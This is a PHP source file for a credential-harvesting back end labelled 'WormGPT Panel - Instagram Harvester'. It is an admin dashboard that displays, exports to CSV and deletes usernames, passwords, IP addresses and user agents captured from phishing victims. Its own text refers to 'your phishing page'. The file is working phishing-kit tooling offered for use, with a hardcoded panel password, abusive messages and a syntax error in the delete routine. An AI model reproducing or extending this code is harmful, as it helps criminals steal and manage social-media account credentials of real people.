<?php
session_start();

// Admin credentials - CHANGE THESE!
$admin_user = 'admin';
$admin_pass = 'wormgpt2024';

// Database configuration
$db_host = 'localhost';
$db_name = 'instagram_panel';
$db_user = 'root';
$db_pass = '';

// Check login
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
        if ($_POST['username'] === $admin_user && $_POST['password'] === $admin_pass) {
            $_SESSION['logged_in'] = true;
            header('Location: panel.php');
            exit();
        } else {
            $error = 'Invalid credentials, you prick!';
        }
    }
    
    // Show login form
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Panel - Login</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .login-box {
                background: #fff;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.3);
                width: 100%;
                max-width: 400px;
            }
            h2 {
                color: #333;
                margin-bottom: 30px;
                text-align: center;
            }
            .input-group {
                margin-bottom: 20px;
            }
            label {
                display: block;
                margin-bottom: 5px;
                color: #555;
                font-weight: 500;
            }
            input {
                width: 100%;
                padding: 12px;
                border: 2px solid #e0e0e0;
                border-radius: 5px;
                font-size: 14px;
                transition: border-color 0.3s;
            }
            input:focus {
                outline: none;
                border-color: #667eea;
            }
            button {
                width: 100%;
                padding: 14px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: #fff;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: transform 0.2s;
            }
            button:hover {
                transform: translateY(-2px);
            }
            .error {
                color: #e74c3c;
                text-align: center;
                margin-bottom: 15px;
                padding: 10px;
                background: #fdeaea;
                border-radius: 5px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>🔐 Admin Panel</h2>
            <?php if (isset($error)): ?>
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            <form method="POST">
                <div class="input-group">
                    <label>Username</label>
                    <input type="text" name="username" required>
                </div>
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit" name="login">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit();
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: panel.php');
    exit();
}

// Delete entry
if (isset($_GET['delete']) && is_numeric($_GET['delete'])) {
    try {
        $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->prepare("DELETE FROM credentials WHERE id = ?");
        $stmt->execute([$_GET['delete']);
    } catch(PDOException $e) {}
    header('Location: panel.php');
    exit();
}

// Clear all
if (isset($_GET['clear_all'])) {
    try {
        $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->exec("TRUNCATE TABLE credentials");
    } catch(PDOException $e) {}
    header('Location: panel.php');
    exit();
}

// Fetch data
try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    $stmt = $pdo->query("SELECT * FROM credentials ORDER BY timestamp DESC");
    $credentials = $stmt->fetchAll(PDO::FETCH_ASSOC);
    
    $count = $pdo->query("SELECT COUNT(*) FROM credentials")->fetchColumn();
} catch(PDOException $e) {
    $credentials = [];
    $count = 0;
    $db_error = $e->getMessage();
}

// Export to CSV
if (isset($_GET['export'])) {
    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="credentials_' . date('Y-m-d_His') . '.csv"');
    
    $output = fopen('php://output', 'w');
    fputcsv($output, ['ID', 'Username', 'Password', 'IP Address', 'User Agent', 'Timestamp']);
    
    foreach ($credentials as $row) {
        fputcsv($output, [
            $row['id'],
            $row['username'],
            $row['password'],
            $row['ip_address'],
            $row['user_agent'],
            $row['timestamp']
        ]);
    }
    fclose($output);
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Captured Credentials</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #f5f6fa;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
            padding: 20px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h1 {
            font-size: 24px;
        }
        .header .stats {
            display: flex;
            gap: 30px;
            align-items: center;
        }
        .stat-box {
            text-align: center;
        }
        .stat-box .number {
            font-size: 28px;
            font-weight: 700;
        }
        .stat-box .label {
            font-size: 12px;
            opacity: 0.9;
        }
        .btn {
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
            font-weight: 500;
            transition: all 0.3s;
            border: none;
            cursor: pointer;
            font-size: 14px;
        }
        .btn-export {
            background: #27ae60;
            color: #fff;
        }
        .btn-export:hover {
            background: #219a52;
        }
        .btn-logout {
            background: rgba(255,255,255,0.2);
            color: #fff;
        }
        .btn-logout:hover {
            background: rgba(255,255,255,0.3);
        }
        .btn-clear {
            background: #e74c3c;
            color: #fff;
        }
        .btn-clear:hover {
            background: #c0392b;
        }
        .btn-delete {
            background: #e74c3c;
            color: #fff;
            padding: 6px 12px;
            font-size: 12px;
        }
        .container {
            padding: 40px;
            max-width: 1400px;
            margin: 0 auto;
        }
        .actions {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
        }
        .table-container {
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th {
            background: #667eea;
            color: #fff;
            padding: 15px;
            text-align: left;
            font-weight: 600;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        td {
            padding: 15px;
            border-bottom: 1px solid #eee;
            font-size: 14px;
        }
        tr:hover {
            background: #f8f9fa;
        }
        .credential {
            font-family: 'Courier New', monospace;
            background: #f0f0f0;
            padding: 5px 10px;
            border-radius: 4px;
            word-break: break-all;
        }
        .password {
            color: #e74c3c;
            font-weight: 600;
        }
        .timestamp {
            color: #666;
            font-size: 13px;
        }
        .ip {
            color: #3498db;
            font-weight: 500;
        }
        .ua {
            max-width: 300px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            color: #666;
            font-size: 12px;
        }
        .empty {
            text-align: center;
            padding: 60px;
            color: #666;
        }
        .empty-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
        @media (max-width: 1200px) {
            .container { padding: 20px; }
            .header { flex-direction: column; gap: 20px; text-align: center; }
            table { font-size: 12px; }
            th, td { padding: 10px; }
            .ua { max-width: 150px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 WormGPT Panel - Instagram Harvester</h1>
        <div class="stats">
            <div class="stat-box">
                <div class="number"><?php echo $count; ?></div>
                <div class="label">Total Captured</div>
            </div>
            <a href="?export=1" class="btn btn-export">📥 Export CSV</a>
            <a href="?clear_all=1" class="btn btn-clear" onclick="return confirm('Clear all records?')">🗑️ Clear All</a>
            <a href="?logout=1" class="btn btn-logout">Logout</a>
        </div>
    </div>
    
    <div class="container">
        <?php if (isset($db_error)): ?>
            <div style="background: #fdeaea; color: #e74c3c; padding: 20px; border-radius: 5px; margin-bottom: 20px;">
                Database Error: <?php echo htmlspecialchars($db_error); ?>
            </div>
        <?php endif; ?>
        
        <div class="table-container">
            <?php if (empty($credentials)): ?>
                <div class="empty">
                    <div class="empty-icon">📭</div>
                    <h3>No credentials captured yet</h3>
                    <p>When victims enter their info on your phishing page, it will appear here.</p>
                </div>
            <?php else: ?>
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>IP Address</th>
                            <th>User Agent</th>
                            <th>Timestamp</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($credentials as $row): ?>
                        <tr>
                            <td><?php echo htmlspecialchars($row['id']); ?></td>
                            <td><span class="credential"><?php echo htmlspecialchars($row['username']); ?></span></td>
                            <td><span class="credential password"><?php echo htmlspecialchars($row['password']); ?></span></td>
                            <td><span class="ip"><?php echo htmlspecialchars($row['ip_address']); ?></span></td>
                            <td><div class="ua" title="<?php echo htmlspecialchars($row['user_agent']); ?>"><?php echo htmlspecialchars(substr($row['user_agent'], 0, 50)) . '...'; ?></div></td>
                            <td><span class="timestamp"><?php echo htmlspecialchars($row['timestamp']); ?></span></td>
                            <td><a href="?delete=<?php echo $row['id']; ?>" class="btn btn-delete" onclick="return confirm('Delete this record?')">Delete</a></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>